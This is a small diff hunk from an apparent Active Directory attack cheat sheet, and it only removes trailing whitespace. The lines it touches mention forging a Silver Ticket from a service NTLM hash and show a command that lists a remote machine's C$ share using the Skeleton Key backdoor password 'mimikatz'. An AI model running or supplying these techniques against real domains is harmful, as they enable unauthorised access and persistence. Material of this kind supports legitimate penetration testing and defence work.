@@ -98,4 +98,4 @@ Note: To create a Silver Ticket, simply put a service NTLM hash into the `/krbtg
 
  > 
  > **<font color=red>dir \\\\</font>Desktop-1<font color=red>\\c$</font> <font color=red>/user:</font>Machine1 <font color=red>mimikatz</font>**<br>
- > List C: drive content using Skleton Key backdoor. 
+ > List C: drive content using Skleton Key backdoor.
